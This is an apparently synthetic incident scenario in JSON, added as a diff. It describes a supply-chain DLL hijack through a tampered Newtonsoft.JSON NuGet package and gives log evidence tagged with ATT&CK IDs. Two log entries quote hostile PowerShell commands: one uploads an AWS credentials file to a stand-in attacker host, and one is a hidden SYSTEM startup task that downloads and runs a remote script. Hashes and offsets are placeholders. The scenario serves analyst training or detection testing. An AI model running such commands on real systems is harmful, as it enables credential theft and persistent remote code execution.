@@ -1,0 +1,47 @@
+{
+  "title": "Supply Chain DLL Hijack - DevOps Pipeline Compromise",
+  "description": "Software supply chain attack via DLL hijacking in CI/CD pipeline. An attacker compromised a popular open-source NuGet package (Newtonsoft.JSON v13.0.3), embedding a malicious DLL that extracted AWS credentials from build agents and established persistence via scheduled tasks. T1195.002 T1574.001 T1059.003 T1053.005",
+  "severity": "High",
+  "evidence": [
+    {
+      "source": "Artifact Repository Log",
+      "content": "NuGet package Newtonsoft.JSON v13.0.3 published from unknown PGP key at 2024-11-10T08:23:00Z. Package hash: sha256:deadbeef12345678abcd1234ef567890. Normal publisher key fingerprint: 4A3B 2C1D 9E8F 7A6B 5C4D 3E2F 1A0B 9C8D 7E6F 5A4B. Actual key: 1B2C 3D4E 5F6A 7B8C 9D0E 1F2A 3B4C 5D6E 7F8A 9B0C. T1195.002 T1195.001",
+      "content_type": "log"
+    },
+    {
+      "source": "Build Agent Sysmon Event 7",
+      "content": "DLL load: Newtonsoft.Json.dll loaded by MSBuild.exe at 2024-11-10T09:15:00Z. Unsigned binary loaded from C:\\Users\\buildagent\\.nuget\\packages\\newtonsoft.json\\13.0.3\\lib\\net6.0\\Newtonsoft.Json.dll. SHA256: deadbeef12345678abcd1234ef567890. T1574.001",
+      "content_type": "log"
+    },
+    {
+      "source": "Build Agent Process Log",
+      "content": "Process tree: MSBuild.exe -> csc.exe -> powershell.exe -Command (New-Object Net.WebClient).UploadFile('https://exfil.attacker.com/upload', 'C:\\Users\\buildagent\\AppData\\Local\\Temp\\aws_credentials.txt'). T1059.001 T1048.002",
+      "content_type": "log"
+    },
+    {
+      "source": "AWS CloudTrail",
+      "content": "API call AssumeRole via AWS CLI from IP 203.0.113.45 at 09:16:30 UTC. Role: arn:aws:iam::123456789012:role/CodeDeployServiceRole. Caller identity: buildagent@company.com. Source IP not in allowed range. T1525 T1078.004",
+      "content_type": "log"
+    },
+    {
+      "source": "S3 Access Log",
+      "content": "GET /company-deploy-artifacts/ from 203.0.113.45. Files accessed: deploy_prod_latest.zip, encrypted_config.json. 45 files downloaded in 12 seconds. T1530 T1525",
+      "content_type": "network"
+    },
+    {
+      "source": "Windows Scheduled Task",
+      "content": "SchTasks creation: PSUpdater scheduled task created. Action: powershell.exe -WindowStyle Hidden -Command 'Invoke-Expression (New-Object Net.WebClient).DownloadString(\"https://gist.githubusercontent.com/attacker/update.ps1\")'. Trigger: At startup. RunAs: SYSTEM. T1053.005 T1059.001",
+      "content_type": "log"
+    },
+    {
+      "source": "Endpoint Detection",
+      "content": "Binary analysis of Newtonsoft.Json.dll from build cache: Contains embedded PE resource 'payload.dll' at offset 0xDEAD. Packer detected: ConfuserEx. Exports include DllRegisterServer and DllInstall. T1027.002 T1027.001",
+      "content_type": "file"
+    },
+    {
+      "source": "GitHub Audit Log",
+      "content": "Personal access token created by user 'devops_alice' from IP 198.51.100.23 (unusual location). Token has repo, workflow, and admin:org scopes. Created at 2024-11-09T22:00:00Z. 2FA was not performed. T1525 T1078.004",
+      "content_type": "log"
+    }
+  ]
+}
